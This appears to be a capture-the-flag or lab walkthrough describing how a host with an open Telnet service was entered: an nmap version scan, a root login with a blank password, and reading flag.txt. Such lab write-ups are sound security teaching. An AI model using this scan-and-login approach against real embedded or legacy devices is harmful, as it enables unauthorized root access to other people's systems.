# 🎯 Easy Telnet Exploitation – Host Summary

This walkthrough covers the compromise of a very basic host running an exposed and misconfigured **Telnet** service with unauthenticated root access.

---

## 🔍 Step 1: Basic Port & Service Scan

Executed a simple version scan to enumerate open ports:

```bash
nmap -sV 192.168.X.X
```

### Output:
```
23/tcp open  telnet
```

Telnet is **insecure by design** — it transmits credentials in plaintext and is highly vulnerable to brute force or login misconfig.

---

## 🔐 Step 2: Manual Telnet Login Attempt

Knowing Telnet was open, we attempted to brute credentials manually.

```bash
telnet 192.168.X.X
```

### ✅ Successful Login:

When prompted for a username, we tried:

```
Username: root
Password: [left blank]
```

No password was required — logged in directly as **root**. Classic misconfig.

---

## 📁 Step 3: Flag Capture

Once in, standard Linux command usage to look for the flag:

```bash
ls
cat flag.txt
```

Flag was sitting in the home directory. Grabbed it, done.

---

## ✅ Summary

| Phase          | Action                        | Result                       |
|----------------|-------------------------------|------------------------------|
| Port Scan      | `nmap -sV`                    | Identified Telnet on port 23 |
| Access Attempt | `telnet`                      | Root login with no password  |
| Enumeration    | `ls`, `cat`                   | Found and captured the flag  |

---

> **Note**: This host represents real-world low-hanging fruit—open Telnet with blank root passwords is still occasionally found in embedded systems, legacy devices, and exposed test environments.

💀 **Root shell in under 30 seconds.**
